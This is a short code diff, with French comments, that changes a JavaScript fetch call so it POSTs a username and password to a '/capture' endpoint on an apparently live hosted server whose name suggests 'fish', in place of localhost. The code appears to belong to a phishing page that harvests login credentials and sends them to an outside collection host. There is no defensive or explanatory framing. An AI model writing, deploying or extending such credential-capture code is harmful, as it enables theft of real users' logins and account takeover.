@@ -118,7 +118,7 @@
 
         try {
             // Envoi des données au serveur (remplace localhost par l'URL de ton serveur une fois en ligne)
-            await fetch('http://localhost:3000/capture', {
+            await fetch('https://fish-production-1f8b.up.railway.app/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username, password })
